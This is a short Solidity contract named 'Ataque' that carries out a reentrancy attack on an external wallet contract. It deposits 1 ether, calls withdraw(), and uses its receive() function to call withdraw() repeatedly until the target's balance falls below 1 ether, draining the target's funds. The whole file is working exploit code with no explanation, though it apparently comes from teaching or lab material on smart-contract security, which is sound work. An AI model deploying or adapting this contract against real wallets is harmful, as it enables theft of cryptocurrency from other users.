// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface IWallet {
    function depositFounds() external payable;
    function withdraw() external;
}

contract Ataque {
    IWallet public immutable wallet;

    constructor(IWallet _wallet) {
        wallet = _wallet;
    }

    function atacar() external payable {
        require(msg.value == 1 ether, "Insuficiente eth");
        wallet.depositFounds{value: 1 ether}();
        wallet.withdraw();
    }
    
    receive() external payable {
        if (address(wallet).balance >= 1 ether)
            wallet.withdraw();
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}